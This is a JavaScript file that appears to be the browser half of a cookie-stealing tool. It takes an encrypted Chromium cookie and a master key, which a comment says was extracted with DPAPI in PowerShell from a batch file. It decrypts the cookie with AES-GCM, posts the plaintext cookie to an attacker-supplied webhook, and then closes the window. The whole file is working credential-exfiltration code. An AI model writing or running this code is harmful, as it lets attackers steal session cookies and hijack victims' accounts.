// Parse URL parameters - API can be called from batch file or browser
const urlParams = new URLSearchParams(window.location.search);
const encryptedCookie = urlParams.get('cookie');
const encryptedKey = urlParams.get('key');
const webhookUrl = urlParams.get('webhook');

console.log('[API] Received parameters:', { encryptedCookie: encryptedCookie ? 'present' : 'missing', encryptedKey: encryptedKey ? 'present' : 'missing', webhookUrl: webhookUrl ? 'present' : 'missing' });

const loading = document.getElementById('loading');
const success = document.getElementById('success');
const error = document.getElementById('error');
const errorMsg = document.getElementById('error-msg');

// Validate request
if (!encryptedCookie || !encryptedKey || !webhookUrl) {
    if (loading) loading.style.display = 'none';
    if (error) {
        error.style.display = 'block';
        errorMsg.textContent = 'Missing required parameters: cookie, key, webhook';
    }
    console.log('[API] Missing parameters');
} else {
    // Decrypt and send to webhook
    decryptAndSend(encryptedCookie, encryptedKey, webhookUrl);
}

async function decryptAndSend(encryptedHex, keyB64, webhook) {
    try {
        console.log('[API] Starting decryption...');
        console.log('[API] Raw inputs:', { 
            encryptedHexLen: encryptedHex.length, 
            keyB64Len: keyB64.length,
            encryptedHexSample: encryptedHex.substring(0, 20) + '...',
            keyB64Sample: keyB64.substring(0, 20) + '...'
        });
        
        // Decode the master key from base64 (should be raw 32 bytes after DPAPI decryption in PowerShell)
        const keyData = Uint8Array.from(atob(keyB64), c => c.charCodeAt(0));
        
        // Convert encrypted hex to bytes
        const encryptedBytes = new Uint8Array(encryptedHex.length / 2);
        for (let i = 0; i < encryptedHex.length; i += 2) {
            encryptedBytes[i / 2] = parseInt(encryptedHex.substr(i, 2), 16);
        }
        
        console.log('[API] Encrypted data info:', { 
            totalBytes: encryptedBytes.length,
            firstFewBytes: Array.from(encryptedBytes.slice(0, 10)),
            prefix: Array.from(encryptedBytes.slice(0, 3))
        });
        
        // Skip first 3 bytes (v10/v11/v20 prefix)
        const nonce = encryptedBytes.slice(3, 15); // 12 bytes
        
        // Extract ciphertext and tag
        const ciphertextTag = encryptedBytes.slice(15);
        const ciphertext = ciphertextTag.slice(0, ciphertextTag.length - 16);
        const tag = ciphertextTag.slice(ciphertextTag.length - 16);
        
        console.log('[API] Decryption parameters:', { nonceLen: nonce.length, ciphertextLen: ciphertext.length, tagLen: tag.length, keyLen: keyData.length });
        
        // Validate parameters before attempting decryption
        if (keyData.length !== 32) {
            throw new Error(`Invalid key length: ${keyData.length}, expected 32 bytes`);
        }
        if (nonce.length !== 12) {
            throw new Error(`Invalid nonce length: ${nonce.length}, expected 12 bytes`);
        }
        if (tag.length !== 16) {
            throw new Error(`Invalid tag length: ${tag.length}, expected 16 bytes`);
        }
        
        console.log('[API] All parameters validated, importing key...');
        
        // Import key
        const cryptoKey = await crypto.subtle.importKey(
            'raw',
            keyData,
            { name: 'AES-GCM' },
            false,
            ['decrypt']
        );
        
        console.log('[API] Key imported, starting decryption...');
        
        // Decrypt
        const plaintext = await crypto.subtle.decrypt(
            { name: 'AES-GCM', iv: nonce, tagLength: 128 },
            cryptoKey,
            new Uint8Array([...ciphertext, ...tag])
        );
        
        console.log('[API] Decryption completed, decoding text...');
        const cookie = new TextDecoder().decode(plaintext).replace(/\0/g, '').trim();
        console.log('[API] Decryption successful! Cookie length:', cookie.length);
        
        // Send to webhook
        const decodedWebhook = decodeURIComponent(webhook);
        const response = await fetch(decodedWebhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: cookie })
        });
        
        console.log('[API] Webhook response:', response.status);
        
        if (loading) loading.style.display = 'none';
        if (success) success.style.display = 'block';
        
        setTimeout(() => {
            window.close();
        }, 2000);
        
    } catch (err) {
        console.error('[API] Error:', err);
        if (loading) loading.style.display = 'none';
        if (error) {
            error.style.display = 'block';
            errorMsg.textContent = 'Decryption failed: ' + err.message;
        }
    }
}
